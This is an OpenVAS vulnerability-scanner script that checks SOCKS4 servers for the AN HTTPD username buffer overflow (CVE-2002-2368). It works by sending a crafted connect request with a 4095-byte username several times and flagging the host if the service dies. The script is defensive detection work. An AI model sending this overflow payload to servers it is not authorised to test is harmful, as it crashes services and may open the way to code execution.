# OpenVAS Vulnerability Test
# $Id: socks4_username_overflow.nasl 17 2013-10-27 14:01:43Z jan $
# Description: SOCKS4 username overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to kill the remote SOCKS4 server by
sending a request with a too long username.

A cracker may exploit this vulnerability to make your SOCKS server
crash continually or even execute arbitrary code on your system.";

tag_solution = "upgrade your software";

# References:
# Message-ID: <20021020163345.19911.qmail@securityfocus.com>
# Date: Mon, 21 Oct 2002 01:38:15 +0900
# From:"Kanatoko" <anvil@jumperz.net>
# To: bugtraq@securityfocus.com
# Subject: AN HTTPD SOCKS4 username Buffer Overflow Vulnerability
#
# Socks4 protocol is described on 
# http://www.socks.nec.com/protocol/socks4.protocol
#
# Vulnerable:
# AN HTTPD

if(description)
{
 script_id(11164);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_cve_id("CVE-2002-2368");
 script_bugtraq_id(5147);
 script_tag(name:"risk_factor", value:"Critical");
 name = "SOCKS4 username overflow";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Too long usernamename kills the SOCKS4A server";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Gain a shell remotely";
 script_family(family);
 script_require_ports("Services/socks4", 1080);
 script_dependencies("find_service.nasl");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

########

include("misc_func.inc");


port = get_kb_item("Services/socks4");
if(!port) port = 1080;
if(! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(0);

nlen = 4095;
# Connect to 10.10.10.10 on port 8080 (= 31*256+4)
cnx = raw_string(4, 1, 4, 31, 10, 10, 10, 10) + crap(nlen) + raw_string(0);

for (i=0; i < 6; i=i+1)
{
 send(socket: soc, data: cnx);
 r = recv(socket: soc, length: 8, timeout:1);
 close(soc);
 soc = open_sock_tcp(port);
 if(! soc) { security_hole(port);  exit(0); }
}

close(soc);
